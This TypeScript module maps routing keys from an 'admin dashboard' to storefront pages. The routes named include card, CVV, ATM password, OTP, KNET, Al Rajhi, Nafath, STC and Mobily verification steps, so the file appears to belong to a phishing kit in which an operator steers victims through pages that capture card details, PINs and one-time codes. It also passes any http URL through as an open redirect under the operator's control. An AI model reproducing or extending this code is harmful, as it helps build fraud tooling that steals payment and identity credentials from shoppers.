// Maps admin dashboard routing keys to real storefront routes.
// Legacy keys stay mapped so older deployed admin builds keep working.

export const ADMIN_PAGE_ROUTES: Record<string, string> = {
  home: "/", index: "/",
  products: "/products",
  cart: "/cart",
  checkout: "/checkout",
  "summary-payment": "/checkout", summary: "/checkout",
  knet: "/knet", "knet-payment": "/knet",
  card: "/card", "credit-card-payment": "/card", "rajhi-payment-error": "/card",
  "otp-verification": "/otp-verification", otp: "/otp-verification",
  "knet-otp": "/knet-otp",
  atm: "/atm", "atm-password": "/atm",
  cvv: "/cvv",
  "final-page": "/final-page", final: "/final-page",
  "moh-login": "/", "moh-register": "/", "moh-create-account": "/",
  "phone-verification": "/otp-verification",
  "nafath-verify": "/otp-verification",
  "nafath-login-page": "/otp-verification",
  "alrajhi-otp": "/otp-verification",
  "mystc-otp": "/otp-verification",
  "stc-password": "/otp-verification",
  "stc-call-alert": "/otp-verification",
  "mobily-call-alert": "/otp-verification",
};

const KNOWN_ROUTE_PREFIXES = [
  "products", "product/", "category/", "cart", "checkout",
  "knet", "knet-otp", "card", "otp-verification", "atm", "cvv", "final-page",
];

function isKnownRoute(key: string): boolean {
  return KNOWN_ROUTE_PREFIXES.some(function (p) { return key === p || key.indexOf(p) === 0; });
}

export function resolveAdminPage(page?: string | null): string | null {
  if (!page) return null;
  const raw = String(page).trim();
  if (!raw) return null;
  if (raw.slice(0, 4) === "http") return raw;
  const key = raw.split("/").filter(Boolean).join("/");
  if (!key) return "/";
  const mapped = ADMIN_PAGE_ROUTES[key];
  if (mapped) return mapped;
  return isKnownRoute(key) ? "/" + key : "/";
}

export function goToAdminPage(page?: string | null): boolean {
  const target = resolveAdminPage(page);
  if (!target) return false;
  if (target.slice(0, 4) === "http") { window.location.href = target; return true; }
  if (window.location.pathname === target) return false;
  window.location.assign(target);
  return true;
}
